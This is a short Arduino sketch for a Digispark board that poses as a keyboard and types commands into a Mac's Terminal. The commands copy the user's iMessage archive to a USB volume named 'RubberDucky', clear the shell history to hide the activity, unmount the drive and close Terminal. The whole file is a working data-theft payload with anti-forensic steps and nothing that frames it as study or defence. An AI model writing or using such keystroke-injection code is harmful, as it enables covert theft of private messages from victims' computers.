#define kbd_es_es
#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.update();
  DigiKeyboard.delay(5000);
}

void loop() {
  DigiKeyboard.sendKeyStroke(KEY_SPACE,MOD_GUI_LEFT);
  delay(2000);
  DigiKeyboard.println("terminal");
  delay(3000);
  DigiKeyboard.println("cp -r ~/Library/Messages/Archive /Volumes/RubberDucky/$USER/");
  DigiKeyboard.println("history -c");
  DigiKeyboard.println("diskutil umount /Volumes/RubberDucky");
  DigiKeyboard.println("history -c");
  DigiKeyboard.println("echo 5A13X99");
  DigiKeyboard.println("exit");
  DigiKeyboard.sendKeyStroke(KEY_Q,MOD_GUI_LEFT);
  while(1);
}
